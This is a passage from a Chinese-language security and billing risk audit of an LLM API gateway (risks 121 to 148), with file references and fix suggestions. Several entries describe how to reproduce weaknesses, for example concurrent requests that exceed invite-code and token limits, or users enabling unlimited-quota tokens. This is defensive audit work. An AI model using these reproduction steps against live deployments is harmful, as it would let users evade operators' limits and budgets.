  - `model/log.go:34-56`：日志表字段有 `Quota`、`Other`，但手工调额没有结构化填入 delta/old/new/reason
  - `model/topup.go:331-345`、`model/user.go:257-277`：收入和累计充值统计依赖 topups，不包含手工调额，这是正向统计口径，但也意味着手工资产只能靠日志追踪
  - `web/default/src/features/users/components/user-quota-dialog.tsx:77-92`、`web/classic/src/components/table/users/modals/EditUserModal.jsx:169-188`：前端没有要求填写调额原因或工单号
- 可能后果：人工补偿和扣费无法纳入统一资产流水，对账时只能解析文本日志；日志写失败时资产变更没有审计记录。发生误操作、账号盗用或客服争议时，很难自动还原“谁在何时因为什么把余额从多少改到多少”。
- 复现思路：执行一次 override 或 subtract，查询 `top_ups` 没有对应记录，日志里只有文本内容；模拟 `LOG_DB.Create` 失败，接口仍已完成资产变更。
- 修复建议：新增 `asset_adjustments` 表或复用统一资产流水，字段包含 user_id、admin_id、delta、old_quota、new_quota、mode、reason、request_id、created_at。资产变更和流水应在同一事务中完成；没有 reason 的高风险调额应拒绝或要求二次确认。
- 优先级：P2
- 当前状态：已确认手工调额缺少结构化资产流水，尚未修复。

### 风险 122：无限额度 token 仍会被写入负的 remain_quota，usage/subscription 展示和预算对账口径失真

- 标题：无限 token 跳过额度校验，但成功结算、预扣和补差仍调用 `DecreaseTokenQuota`，导致 `remain_quota` 被持续扣成负数、`used_quota` 持续增加
- 影响范围：无限额度 token、OpenAI 兼容 usage/subscription 接口、token usage API、客户预算展示、客服对账、Redis token cache
- 触发条件：用户创建或更新 `unlimited_quota=true` 的 token，并用该 token 发起非 playground 请求；请求命中信任额度旁路或正常预扣后最终结算
- 涉及文件/函数：
  - `model/token.go:23-28`：token 同时保存 `remain_quota`、`unlimited_quota`、`used_quota`
  - `model/token.go:188-220`：`ValidateUserToken` 对无限 token 跳过 `RemainQuota <= 0` 拒绝
  - `middleware/auth.go:409-420`：无限 token 写入 `token_unlimited_quota`，不写 `token_quota`
  - `service/billing_session.go:189-204`：信任额度旁路下无限 token 可把预扣额度置为 0
  - `service/billing_session.go:59-67`、`service/quota.go:432-440`：结算和后扣费路径不区分无限 token，仍调用 `DecreaseTokenQuota/IncreaseTokenQuota`
  - `service/quota.go:382-400`：预扣路径只跳过无限 token 的不足校验，但仍继续执行 `DecreaseTokenQuota`
  - `model/token.go:394-431`：扣 token 会同时 `remain_quota = remain_quota - ?`、`used_quota = used_quota + ?`
  - `controller/token.go:150-160`：token usage 返回 `total_granted = RemainQuota + UsedQuota`、`total_available = RemainQuota`
  - `controller/billing.go:17-23`、`56-58`：dashboard subscription 在 token 统计模式读取 token remain/used，对无限 token 又把 subscription limit 固定显示为 `100000000`
- 可能后果：无限 token 的 `remain_quota` 会在每次消费后变为负数；`/api/usage/token` 可能显示负的 `total_available`，`total_granted` 对无限 token 失去业务含义；dashboard billing 接口又把无限 token 显示成固定大额，和 token usage、DB 资产字段不一致。该问题本身不绕过用户钱包或订阅扣费，但会让运营误判 token 是否超支、是否应限制客户子账号，以及发生争议时难以按同一口径解释。
- 复现思路：本地创建 `unlimited_quota=true` 且 `remain_quota=0` 的 token，完成一次成功模型调用；查询 `tokens.remain_quota/used_quota` 和 `/api/usage/token`。预期会看到 remain 为负、used 为正，而鉴权仍因 unlimited 跳过 remain 检查。
- 修复建议：把“无限 token 的使用统计”和“有限 token 的剩余额度”拆开。无限 token 只累计 `used_quota`，不再递减 `remain_quota`；或将无限 token 的 `remain_quota` 语义固定为 null/0 且所有 usage 接口显式返回 `unlimited_quota=true`、`total_available=null`。结算层应在 `relayInfo.TokenUnlimited` 时走专用统计更新函数，避免复用有限额度扣减函数。
- 优先级：P2
- 当前状态：已确认无限 token 会绕过额度校验但仍被扣减 remain quota，尚未修复。

### 风险 123：OpenAI 兼容 billing 字段名固定为 USD，但返回值会随站点展示货币切换，串联渠道余额可能被按错误单位写入

- 标题：`soft_limit_usd/hard_limit_usd/system_hard_limit_usd/total_usage` 这些 OpenAI 兼容字段按 `QuotaDisplayType` 转成 CNY 或 TOKENS；下游余额同步仍把它们当 USD 计算并写入 channel balance
- 影响范围：OpenAI 兼容 dashboard billing/usage、NewAPI 作为上游渠道被另一套 NewAPI/OneAPI 查询余额、渠道余额展示、批量自动禁用、余额告警
- 触发条件：站点将 `QuotaDisplayType` 设置为 `CNY`、`TOKENS` 或未来的自定义货币；另一个系统把该站点作为 OpenAI/Custom 兼容渠道，并调用 `/v1/dashboard/billing/subscription` 和 `/v1/dashboard/billing/usage` 更新余额
- 涉及文件/函数：
  - `controller/channel-billing.go:26-33`：OpenAI subscription 响应字段名固定带 `_usd`
  - `controller/channel-billing.go:50-54`：usage 响应 `TotalUsage` 注释为 0.01 dollar
  - `controller/billing.go:41-55`：subscription 金额根据 `QuotaDisplayType` 转成 USD/CNY/TOKENS
  - `controller/billing.go:93-104`：usage 同样根据 `QuotaDisplayType` 转换后再乘 100
  - `setting/operation_setting/general_setting.go:5-18`：站点支持 USD/CNY/TOKENS/CUSTOM 展示类型
  - `controller/channel-billing.go:392-420`：渠道余额同步读取兼容接口，并按 `HardLimitUSD - TotalUsage/100` 计算余额
  - `model/channel.go:585-589`：计算结果直接写入 channel `balance`
  - `controller/channel-billing.go:470-477`：批量更新时余额 `<= 0` 会触发自动禁用渠道
- 可能后果：上游以 CNY 展示时，下游会把人民币数值当美元余额；上游以 TOKENS 展示时，下游可能把 token 数量当美元余额，形成极大余额污染，低余额告警和自动禁用失效。反向情况下也可能误判余额不足并批量禁用渠道。该问题不改变真实充值资产，但会误导运营路由和渠道可用性判断。
- 复现思路：A 站把展示类型设为 TOKENS 或 CNY，B 站把 A 站配置为 Custom/OpenAI 兼容渠道；在 B 站触发 `/api/channel/update_balance/:id`，观察 B 站 `channels.balance` 被写成展示单位而不是 USD。
- 修复建议：OpenAI 兼容接口必须保持协议单位稳定，`*_usd` 和 `total_usage` 始终返回 USD 语义；站点展示货币应只用于前端展示或新增非兼容字段，例如 `display_amount/display_currency`。渠道余额同步应校验返回值单位、范围和来源类型，对 NewAPI 自身兼容接口可增加版本字段或专用余额 API。
- 优先级：P2
- 当前状态：已确认 billing/usage 兼容接口把展示货币写入 USD 字段，尚未修复。

### 风险 124：用户统计模式下 `GetSubscription` 会覆盖余额查询错误，可能返回看似正常但缺失 remain quota 的订阅额度

- 标题：`DisplayTokenStatEnabled=false` 时先读用户剩余额度再读已用额度，第二次调用会覆盖第一次错误；若 `GetUserQuota` 失败但 `GetUserUsedQuota` 成功，接口不会进入错误分支
- 影响范围：OpenAI 兼容 subscription 接口、用户余额展示、外部客户端限额判断、渠道余额同步、故障排查
- 触发条件：关闭 token 统计展示，使用用户维度统计；Redis/DB/缓存层在读取用户 `quota` 时异常，随后 `used_quota` 查询成功；或者未来 `GetUserQuota` 增加更严格错误返回但该控制器仍复用同一 `err`
- 涉及文件/函数：
  - `controller/billing.go:23-31`：`remainQuota, err = GetUserQuota(...)` 后立刻 `usedQuota, err = GetUserUsedQuota(...)`，第一次错误会被覆盖
  - `model/user.go:905-930`：`GetUserQuota` 先读 Redis 后回源 DB，异常时返回错误
  - `model/user.go:933-935`：`GetUserUsedQuota` 独立读取 used quota
  - `controller/billing.go:31-40`：只有最终 `err != nil` 才返回错误 JSON
  - `controller/channel-billing.go:392-420`：外部余额同步会把 subscription/usage 结果用于计算渠道余额
- 可能后果：余额查询故障时，subscription 可能仍返回 `hard_limit_usd = used_quota` 或其他缺失 remain 的结果，看起来是正常响应；外部客户端或下游渠道余额同步会据此误判账户余额。运营排障时也会缺少“余额读取失败”的明确信号。
- 复现思路：关闭 `DisplayTokenStatEnabled`，在本地让 `model.GetUserQuota` 返回错误而 `GetUserUsedQuota` 正常；请求 `/v1/dashboard/billing/subscription`，观察接口可能返回 200 正常 subscription 而不是错误体。
- 修复建议：分别保存 `remainErr` 和 `usedErr`，任一失败都返回明确错误；如果为了兼容必须返回 200，应在 body 中返回 `error` 且不要继续拼装正常 subscription。余额类接口需要结构化日志记录 user_id、token_id、失败阶段和 request_id。
- 优先级：P2
- 当前状态：已确认控制器存在错误覆盖逻辑，尚未修复。

### 风险 125：`general_setting.quota_display_type` 和自定义货币参数只靠前端校验，后端可保存非法枚举或异常展示汇率

- 标题：新版/经典前端限制展示类型为 USD/CNY/TOKENS/CUSTOM，后端分层配置只按字符串和 float 反射赋值；非法展示类型、空自定义符号或异常汇率可进入运行时配置
- 影响范围：用户余额展示、充值金额展示、usage/billing 兼容接口、渠道余额同步、客服对账、运营报表
- 触发条件：Root 直接调用 `/api/option`，或配置导入/脚本写入 `general_setting.quota_display_type=BAD`、`general_setting.custom_currency_exchange_rate=0/-1/NaN/极大值`、超长/空自定义货币符号；或者前端以外的客户端绕过 zod/select 校验
- 涉及文件/函数：
  - `router/api-router.go:189-193`：`/api/option` 仅要求 RootAuth，通用 PUT 入口为 `controller.UpdateOption`
  - `controller/option.go:120-152`：通用 option 更新只对合规字段和少数 key 做前置保护，未覆盖 `general_setting.quota_display_type`
  - `controller/option.go:218-225`：后端只对 `theme.frontend` 做 enum 校验，没有同类 `quota_display_type` 校验
  - `model/option.go:259-267`：`updateOptionMap` 先写 `OptionMap`，再走分层配置处理
  - `model/option.go:588-622`：`handleConfigUpdate` 对 `general_setting.*` 直接调用 `config.UpdateConfigFromMap`
  - `setting/config/config.go:203-239`：反射更新 string/float 字段，不做枚举、正数、有限数或长度校验
  - `setting/operation_setting/general_setting.go:5-22`：业务只定义了 USD/CNY/TOKENS/CUSTOM 及自定义货币汇率字段
  - `web/default/src/features/system-settings/general/pricing-section.tsx:64-70`：新版前端有 enum 和最小汇率校验
  - `web/classic/src/pages/Setting/Operation/SettingsGeneral.jsx:277-299`：classic 前端通过 select 限制展示类型
- 可能后果：后台和公开状态接口可能进入未知展示模式，前端、日志、billing 兼容接口和渠道余额同步使用不同兜底逻辑，造成余额显示与真实扣费单位脱节；异常自定义汇率会把所有展示金额放大、缩小或回退为默认值，客服和运营容易按错误金额判断充值/消费争议。结合风险 123，串联站点的渠道余额还可能被错误单位污染。
- 复现思路：本地用 Root 调用 `/api/option` 保存 `{"key":"general_setting.quota_display_type","value":"BAD"}`，再请求 `/api/status`、余额展示和 `/v1/dashboard/billing/subscription`；再保存 `custom_currency_exchange_rate=0` 或极大值，观察前端展示、日志格式和 billing 输出是否与预期单位一致。
- 修复建议：为 `general_setting` 增加后端 `Validate()`：`quota_display_type` 必须是 USD/CNY/TOKENS/CUSTOM；CUSTOM 必须要求非空且长度受限的 symbol、有限且在业务范围内的 exchange rate；非 CUSTOM 可忽略或清空自定义字段。分层配置更新应统一走 validate -> persist -> apply，失败不得写 DB/OptionMap。
- 优先级：P2
- 当前状态：已确认后端缺少展示类型枚举和自定义货币值域校验，尚未修复。

### 风险 128：订阅购买会写入 success 的 topup 镜像但缺少资产类型和 provider，累计充值与普通充值收入难以区分

- 标题：`CompleteSubscriptionOrder` 完成套餐后调用 `upsertSubscriptionTopUpTx` 写入 `top_ups`，该记录 `amount=0`、`money=order.Money`、`status=success`，但没有标识它是订阅购买镜像，也没有写入 `payment_provider`
- 影响范围：`users.topup_money`、用户列表“Topup Amount”、充值分析报表、按网关统计收入、订阅收入与余额充值收入拆分、人工对账
- 触发条件：用户通过 Stripe/Creem/Epay/Waffo Pancake 购买订阅套餐；订单完成后系统创建订阅 topup 镜像；运营查看用户累计充值、充值分析或按 payment provider 汇总数据
- 涉及文件/函数：
  - `model/subscription.go:612-665`：订阅订单完成后创建用户订阅、调用 `upsertSubscriptionTopUpTx`，再刷新用户 `topup_money`
  - `model/subscription.go:687-720`：订阅镜像 topup 使用 `Amount: 0`、`Money: order.Money`、`PaymentMethod: order.PaymentMethod`、`Status: success`，未写 `PaymentProvider` 或资产类型
  - `model/user.go:257-277`：`topup_money` 只按 success `top_ups.money` 汇总，不区分普通充值、订阅镜像或人工补单
  - `model/topup.go:331-345`：充值分析按 `payment_method/payment_provider` 汇总 success `top_ups.money`
  - `controller/usedata.go:45-58`：后台充值分析直接返回上述聚合数据
  - `web/default/src/features/users/components/users-columns.tsx:227-239`：用户列表把 `topup_money` 展示为 `Topup Amount`
- 可能后果：运营看 `Topup Amount` 或充值分析时，无法判断金额来自余额充值、套餐购买镜像还是管理员补单；订阅镜像没有 provider 会落入空 provider 分组，按网关收入统计偏差。若后续要按累计充值做用户等级、返利、风控或财务对账，套餐收入和余额充值会混在一个字段里，容易误判真实现金流和用户充值行为。
- 复现思路：本地创建并完成一笔订阅订单，查询 `top_ups` 中同 trade_no 的镜像记录；观察 `amount=0`、`money=order.Money`、`payment_method` 有值但 `payment_provider` 为空。随后查看 `users.topup_money` 和 `/api/data/topups` 聚合，确认它被计入累计充值和充值分析。
- 修复建议：为 `top_ups` 或独立收入流水增加 `asset_type/source_type`，明确区分 `wallet_topup`、`subscription_purchase`、`manual_completion`、`admin_adjustment`、`refund_adjustment`。订阅镜像应保存 `payment_provider`、plan_id、subscription_order_id，并在充值分析中支持按资产类型过滤。用户列表若展示总消费/总支付，应改名并提供拆分字段。
- 优先级：P2
- 当前状态：已确认订阅镜像 topup 缺少 provider 和资产类型，尚未修复。

### 风险 132：邀请额度划转绕过用户额度缓存刷新和结构化资产流水，成功后账务可见性不足

- 标题：划转成功后只提交 `users.aff_quota/quota`，没有调用额度缓存更新、没有记录 `RecordLog`，也没有独立的 affiliate transfer 流水
- 影响范围：API relay 鉴权额度缓存、用户钱包展示、运营审计、客服排障、邀请返利对账、异常回滚
- 触发条件：Redis 用户缓存已存在；用户完成邀请额度划转后立即发起 API 请求；运营需要追踪某笔主余额来自邀请返利划转；后续出现退款、封号、邀请作弊或手工修复时需要回放资产变更。
- 涉及文件/函数：
  - `model/user.go:466-500`：`TransferAffQuotaToQuota` 直接 `tx.Save(user)`，未调用 `IncreaseUserQuota`、`updateUserQuotaCache`、`InvalidateUserCache` 或 `RecordLog`
  - `model/user_cache.go:17-25`：用户缓存包含 `Quota`，用于请求上下文和额度判断
  - `model/user_cache.go:79-118`：`GetUserCache` 会优先返回 Redis 中的 `Quota`
  - `model/user_cache.go:199-204`：仓库已有单字段 `updateUserQuotaCache`，但划转路径没有使用
  - `model/user.go:1009-1024`：常规 `IncreaseUserQuota` 会异步增加缓存并处理批量更新，划转路径绕过该入口
  - `model/log.go:91-107`：已有 `RecordLog` 可记录系统/充值类日志，注册邀请赠送和充值返利路径已有日志，划转路径没有同等级记录
  - `controller/user.go:410-455`：`GetSelf` 返回 DB 中的 `quota/aff_quota`，但 relay 侧可能仍读缓存中的旧 `Quota`
- 可能后果：用户划转成功后，前端刷新自我信息能看到 DB 新余额，但 API 请求链路若命中旧 Redis `Quota`，可能继续按划转前余额判断，造成“钱已转入但暂时不能用”的客服问题；反过来，运营侧只能看到当前字段值，缺少可审计的划转流水，不利于排查返利套利、异常回滚或争议处理。
- 复现思路：启用 Redis 后，先通过 `GetUserCache` 或一次 API 请求填充用户缓存；执行 `/api/user/aff_transfer`；立即读取 Redis `user:<id>` 的 `Quota` 或发起依赖缓存额度的请求，观察是否仍为旧值。再查看日志表是否存在对应的“邀请额度划转”记录。
- 修复建议：划转提交成功后同步更新或失效用户缓存，至少更新 `Quota` 字段；新增 `LogTypeSystem` 或专门资产流水记录，包含 `from=aff_quota`、`to=quota`、金额、前后余额、request id。长期应建立统一 asset ledger，让充值、兑换码、邀请返利、邀请划转、管理员调额都能用同一对账口径。
- 优先级：P2
- 当前状态：已确认划转路径缺少缓存刷新和结构化日志，尚未修复。

### 风险 134：自助邀请码每日创建上限是先 Count 后 Create，并发请求可超过每日限额

- 标题：普通用户创建邀请码时先 `CountInviteCodesCreatedToday` 再批量创建，计数和插入不在同一条件更新/锁内；并发请求会各自看到相同剩余额度
- 影响范围：普通用户邀请码创建、invite-only 注册容量、运营限流、反滥用策略
- 触发条件：同一普通用户并发发送多个 `/api/user/invite_codes` 请求；每个请求的 `count` 都不超过当时查询到的 `remaining`；接口未加 `CriticalRateLimit` 或用户级锁。
- 涉及文件/函数：
  - `router/api-router.go:94-96`：自助邀请码创建接口在普通用户路由下，没有额外 critical rate limit
  - `controller/invite.go:130-141`：普通用户路径通过 `CountInviteCodesCreatedToday` 算 `remaining`
  - `model/invite_code.go:127-132`：每日计数只做普通 `COUNT(*)`
  - `controller/invite.go:154-164`：计数通过后才调用 `model.CreateInviteCodes`
  - `model/invite_code.go:92-123`：创建邀请码的事务只覆盖批量 insert，不包含每日限额计数
- 可能后果：默认每日 5 个的邀请码限制可被并发放大，例如两个并发请求都看到剩余 5 并各自创建 5 个，最终当天创建 10 个以上；配合风险 133 的大 `max_uses`，实际可邀请人数会进一步失控。
- 复现思路：把 `InviteCodeDailyLimit` 设为 5，以同一普通用户并发提交两到三次 `count=5` 的创建请求；观察成功返回数量和 `invite_codes` 当天记录数是否超过 5。
- 修复建议：用用户级互斥、事务内可锁定的计数表，或将每日额度作为独立计数器做原子扣减；至少对该接口增加用户级 rate limit。创建时按 `SUM(max_uses - used_count)` 或新增可用次数限制，而不只按记录条数限制。
- 优先级：P2
- 当前状态：已确认限额检查和创建事务分离，尚未修复。

### 风险 136：邀请码只保留单个 `used_user_id` 且可硬删除，无法完整审计多次使用和删除后的奖励来源

- 标题：`invite_codes` 记录只存一组 `used_user_id/used_time`，多次使用时会覆盖最后使用者；删除接口直接 `DB.Delete`，模型没有软删除字段和操作日志
- 影响范围：邀请码使用审计、邀请奖励来源追踪、客服排障、反作弊、用户自助删除和管理员删除
- 触发条件：邀请码 `max_uses > 1` 或被并发超用；创建者或管理员删除已使用的邀请码；运营需要追踪某个邀请奖励、某个注册用户使用了哪一个邀请码。
- 涉及文件/函数：
  - `model/invite_code.go:20-34`：`InviteCode` 只有单个 `UsedUserId`、`UsedTime`，没有逐次使用表，也没有 `DeletedAt`
  - `model/invite_code.go:311-317`：每次消费都覆盖 `UsedUserId/UsedTime`
  - `model/invite_code.go:185-217`：列表展示只按单个 `UsedUserId` 补 `UsedUsername`
  - `controller/invite.go:264-275`：删除接口没有区分已用/未用状态，也没有记录删除日志
  - `model/invite_code.go:232-240`：普通用户可删除自己创建的邀请码，管理员可删任意邀请码，执行 `DB.Delete`
  - `model/user.go:608-616`：邀请奖励发放日志只有“邀请用户赠送额度”文本，没有绑定邀请码 id/code 或被邀请用户 id
- 可能后果：多次使用邀请码后，系统无法还原全部使用者；删除已使用邀请码后，注册用户的 `inviter_id` 和奖励日志仍存在，但邀请码来源记录消失，无法可靠判断奖励是否来自合法邀请码、是否超过次数、是否被用户删除证据。出现邀请套利、批量注册或争议退款时，对账和取证困难。
- 复现思路：创建 `max_uses=2` 的邀请码，注册两个用户后查看 `invite_codes.used_user_id` 是否只保留第二个用户；再由创建者调用删除接口，确认邀请码主记录消失且没有对应 `LogTypeManage` 或资产流水。
- 修复建议：新增 `invite_code_usages` 表，记录 `invite_code_id/code/user_id/inviter_id/created_at/request_id`，并对同一用户使用同一码建立唯一约束；邀请码删除改为软删除或禁用，不允许普通用户删除已有使用记录；创建、更新、删除均记录管理日志。奖励日志应包含邀请码 id/code、被邀请用户 id 和发放金额。
- 优先级：P2
- 当前状态：已确认邀请码使用和删除缺少完整审计，尚未修复。

### 风险 139：邮箱验证码和密码重置 token 只保存在进程内 Map，多实例/重启会导致注册、绑定和重置不稳定

- 标题：验证码状态使用本地 `verificationMap` 保存，没有 Redis/DB 持久化；多实例部署或进程重启会让验证码在不同节点不可见或直接丢失
- 影响范围：邮箱注册、邮箱绑定、密码重置、客服工单、故障期间账号恢复
- 触发条件：多副本部署且负载均衡没有会话粘滞；发送验证码请求打到实例 A，注册/绑定/重置请求打到实例 B；实例重启或滚动发布发生在验证码有效期内。
- 涉及文件/函数：
  - `common/verification.go:21-24`：验证码存储为进程内全局 map，默认有效期 10 分钟
  - `common/verification.go:35-45`：`RegisterVerificationCodeWithKey` 只写本地 map
  - `common/verification.go:47-56`：`VerifyCodeWithKey` 只读本地 map
  - `controller/misc.go:290-296`：邮箱验证邮件发送后只注册本地验证码
  - `controller/misc.go:317-325`：密码重置 token 也只注册本地验证码
  - `controller/user.go:1045-1062`：邮箱绑定同样依赖本地验证码
  - `middleware/email-verification-rate-limit.go:72-80`：发送验证码的频率限制已支持 Redis，说明验证码本身仍缺少同等级多实例支持
- 可能后果：用户收到正确验证码或重置链接后仍可能验证失败，造成注册和找回密码不可用；支付事故或登录事故期间，运营可能误判为用户输入错误。该问题不是直接资产增发漏洞，但会影响账号恢复和合规邮箱绑定的可靠性。
- 复现思路：本地启动两个实例共享数据库但不共享内存；在实例 A 请求 `/api/verification`，再把注册或 `/api/oauth/email/bind` 请求路由到实例 B，观察验证码校验失败。滚动重启实例后，旧邮件中的重置链接也会失效。
- 修复建议：将验证码和重置 token 存入 Redis 或数据库，包含 purpose、email、过期时间、使用状态和尝试次数；验证成功后原子消费。多实例环境下避免本地内存作为唯一状态源，重置密码 token 还应绑定用户 id 和一次性使用。
- 优先级：P2
- 当前状态：已确认验证码状态仅在进程内保存，尚未修复。

### 风险 143：管理员硬删除用户不处理关联资产和身份记录，形成孤儿 token、订单、订阅、邀请和 OAuth 绑定

- 标题：硬删除只删除 `users` 主表记录，不级联处理 `tokens/top_ups/subscription_orders/user_subscriptions/invite_codes/user_oauth_bindings/passkey/twofa` 等按 `user_id` 关联的数据
- 影响范围：用户资产审计、充值历史、订阅权益、邀请关系、OAuth 绑定、Passkey/2FA、日志和客服排障、数据导入/恢复
- 触发条件：管理员使用 default 后台硬删除用户或直接调用 `DELETE /api/user/:id`；目标用户已有 token、充值、订阅、邀请、任务、日志或绑定记录；后续运营按用户 id 查询或做资产对账。
- 涉及文件/函数：
  - `model/user.go:447-452`、`controller/user.go:807`：硬删除只删除用户主记录
  - `model/token.go:14-31`：token 以 `user_id` 关联用户，硬删除用户不会删除 token
  - `model/topup.go:17`：充值订单保留 `user_id`
  - `model/subscription.go:205`、`model/subscription.go:244`：订阅订单和用户订阅保留 `user_id`
  - `model/invite_code.go:24-29`：邀请码有 `creator_id/inviter_id/used_user_id`
  - `model/user_oauth_binding.go:11-16`：自定义 OAuth 绑定有 `user_id`
  - `model/passkey.go:25`、`model/twofa.go:16`：Passkey/2FA 均以 `user_id` 关联
  - `model/log.go:35-43`、`model/task.go:50`、`model/midjourney.go:6`：日志和任务也按 `user_id` 留存
  - `model/user.go:698-707`：软删除保留用户行，可维持关联查询和历史审计，是正向对比
- 可能后果：用户主记录消失后，订单、订阅、邀请和 token 仍保留孤儿 `user_id`；充值/订阅收入和邀请奖励来源难以还原，OAuth 绑定或 token 数据可能在后续手工恢复、导入、用户 id 冲突或审计查询中造成误判。硬删除还会破坏“用户已注销但历史资产可追溯”的运营要求。
- 复现思路：创建用户并产生 token、topup、subscription、invite_code、passkey 或 2FA 记录；调用 `DELETE /api/user/:id`；查询各表是否仍存在该 `user_id` 的记录，以及后台用户详情/充值/订阅弹窗是否能解释这些孤儿资产。
- 修复建议：后台默认删除应改为软删除/禁用，并保留主用户记录用于历史审计；硬删除只作为受限维护任务，必须先生成影响清单并清理或归档关联表。需要新增统一 `DeleteUserService`：撤销 token、取消/归档订阅、保留 topup/log 但标记 deleted user snapshot、删除 auth binding/passkey/2FA，并记录管理员、原因和 request id。
- 优先级：P2
- 当前状态：已确认硬删除没有关联资产清理或归档，尚未修复。

### 风险 144：管理员创建/编辑/硬删除用户缺少结构化审计日志，无法还原高危身份操作来源

- 标题：后台创建用户、编辑用户、硬删除用户成功后不调用 `RecordLogWithAdminInfo`；只有额度调整和部分绑定清理记录管理员维度日志
- 影响范围：管理员操作审计、权限提升/降级追踪、用户分组变更、密码重置式编辑、用户删除、合规追责
- 触发条件：管理员调用 `POST /api/user/` 创建用户、`PUT /api/user/` 编辑用户名/显示名/分组/备注/密码，或 `DELETE /api/user/:id` 硬删除用户；后续需要追踪是哪位管理员、何时、改了哪些字段。
- 涉及文件/函数：
  - `controller/user.go:840-877`：`CreateUser` 创建成功后直接返回，没有管理日志
  - `controller/user.go:578-618`：`UpdateUser` 更新成功后直接返回，没有记录字段 diff、管理员和目标用户
  - `controller/user.go:791-817`：`DeleteUser` 硬删除成功后直接返回，没有管理日志
  - `controller/user.go:955-993`：额度调整使用 `RecordLogWithAdminInfo` 记录 `admin_id/admin_username`，是正向对比
  - `controller/user.go:621-652`：清理绑定会记录普通管理日志，但未带结构化 `admin_info`
  - `model/log.go:109-147`：已有 `RecordLogWithAdminInfo` 能承载管理员元信息
- 可能后果：出现异常账号、权限误改、分组变更导致成本倍率变化、或用户被误删时，运营只能从请求日志或数据库状态反推，无法在应用内日志中确认操作者和字段变化。对涉及资产的用户分组、密码、删除操作，这会削弱追责和回滚依据。
- 复现思路：在后台创建一个用户、修改其分组/密码、再硬删除；查询 `logs` 表中该用户 id 是否存在对应 `LogTypeManage` 且包含 `admin_info`、变更前后字段和删除原因。
- 修复建议：为所有管理员身份操作统一记录结构化管理日志：操作者 id/name、目标用户 id/name、动作、字段 diff、来源 IP/request id。创建、编辑、删除、启用、禁用、升降级、绑定清理都应走同一审计 helper；硬删除应要求原因并二次确认。
- 优先级：P2
- 当前状态：已确认创建/编辑/硬删除用户缺少结构化审计日志，尚未修复。

### 风险 145：普通用户 token 数量上限是先计数再插入，并发创建可突破 `MaxUserTokens`

- 标题：`AddToken` 使用 `CountUserTokens` 判断数量后再 `Insert`，没有事务锁、用户级计数器或数据库约束兜底；并发请求可能同时通过上限检查
- 影响范围：普通用户 API token 创建、token 管理上限、泄露凭证面、Redis token 缓存、后台分页和搜索
- 触发条件：用户当前 token 数接近 `operation_setting.GetMaxUserTokens()`；多个创建请求并发进入 `/api/token/`；前端批量创建或脚本并发调用；数据库没有按用户限制活跃 token 数的约束。
- 涉及文件/函数：
  - `router/api-router.go:276-287`：`/api/token` 路由在普通 `UserAuth` 下暴露创建、更新、删除、批量删除和批量导出 key
  - `controller/token.go:167-225`：`AddToken` 先校验参数，再调用 `CountUserTokens`，最后生成 key 并插入 token
  - `model/token.go:435-439`：`CountUserTokens` 仅按 `user_id` 做普通 `COUNT`
  - `model/token.go:279-282`：`Token.Insert` 只是单条 `DB.Create`，没有和计数检查处于同一事务
  - `web/classic/src/components/table/tokens/modals/EditTokenModal.jsx:254-285`：classic 前端支持循环创建多个 token，每次独立请求后端
- 可能后果：用户可在并发条件下创建超过运营配置上限的 token，扩大泄露和滥用半径；后台限制展示为已达上限但数据库中已经存在更多可用 key。该问题不是直接充值入账漏洞，但会削弱凭证数量控制、风控和客服排障。
- 复现思路：本地将 `MaxUserTokens` 设为较小值，让用户已有 `max-1` 个 token；并发发送多次 `POST /api/token/`，观察是否有两个以上请求在同一计数结果下同时成功，最终 token 数超过配置上限。
- 修复建议：把“检查数量并创建 token”放进同一事务，对用户行或专用 token quota 行加锁；或维护用户级活跃 token 计数并用条件更新 `active_token_count < max` 兜底。若数据库支持，可为高价值版本设计用户 token 上限触发器或通过服务层单飞锁防止同用户并发创建。
- 优先级：P2
- 当前状态：已确认存在计数后插入并发窗口，尚未通过并发测试复现。

### 风险 146：普通用户可自助创建和编辑无限额度 token，且新版前端默认开启

- 标题：`AddToken/UpdateToken` 接受用户提交的 `unlimited_quota=true`，后端没有按站点策略、用户角色或用户余额限制；default 前端默认值也是无限额度
- 影响范围：普通用户 API token 限额策略、token 级预算隔离、泄露 token 的滥用半径、OpenAI 兼容 billing 展示、客服对“单个 key 限额”的预期
- 触发条件：普通用户创建或编辑 token 时设置 `unlimited_quota=true`；运营期望每个 token 有独立预算上限；token 泄露或被自动化脚本长期持有。
- 涉及文件/函数：
  - `controller/token.go:178-189`、`controller/token.go:263-273`：只有非无限额度时才检查 `remain_quota` 非负和最大值
  - `controller/token.go:210-223`：创建 token 时直接保存用户提交的 `UnlimitedQuota`
  - `controller/token.go:291-301`：编辑 token 时直接覆盖 `UnlimitedQuota`
  - `middleware/auth.go:413-420`：无限额度 token 不设置 `token_quota` 上下文
  - `controller/billing.go:56-58`：无限额度 token 的订阅上限固定展示为 `100000000`
  - `web/default/src/features/keys/lib/api-key-form.ts:66-75`：default 前端创建 token 的 `unlimited_quota` 默认值为 `true`
  - `web/default/src/features/keys/components/api-keys-mutate-drawer.tsx:470-489`：前端向普通用户展示“Unlimited Quota”开关
  - `web/classic/src/components/table/tokens/modals/EditTokenModal.jsx:222-285`：classic 创建和编辑也会把 `unlimited_quota` 原样提交给后端
- 可能后果：运营以为 token 额度可作为单 key 风险阀门，但普通用户可自行关闭这个阀门；一旦 key 泄露，消耗边界会退化为用户总余额和其他链路的预扣校验。对代理分销、企业子账号、自动化任务分 key 管理等场景，单 token 预算隔离会失效，billing/subscription 还会给下游显示极高软限额。
- 复现思路：普通用户在 default 前端创建新 API key，不修改默认表单；查询 `tokens.unlimited_quota` 是否为 true。再编辑已有有限额度 key，将 `unlimited_quota` 改为 true，确认后端接受并更新缓存。
- 修复建议：增加站点级策略开关，例如 `AllowUserUnlimitedToken`，默认关闭；普通用户创建 token 时必须设置有限额度，且 token 额度不得超过用户当前可用额度或管理员配置的单 key 上限。无限额度只允许管理员、受信用户组或内部系统 token 使用，并在列表和审计日志中标记高危凭证。
- 优先级：P2
- 当前状态：已确认普通用户路径可创建/编辑无限额度 token；是否属于产品设计需运营明确，但默认开启会放大风险。

### 风险 148：token 模型限制按归一化模型名匹配，无法精确限制 Gemini thinking budget 等具体变体

- 标题：`Distribute` 会把请求模型归一化后再匹配 token `model_limits`；`gemini-2.5-*-thinking-<budget>` 会统一折叠到 `*-thinking-*`，导致“只允许某个具体 budget 变体”无法表达，放行通配符又会放行同族所有 budget 变体
- 影响范围：普通用户 token 模型限制、Gemini/Vertex thinking budget 模型、gizmo 通配模型、模型成本控制、企业子 key 权限隔离
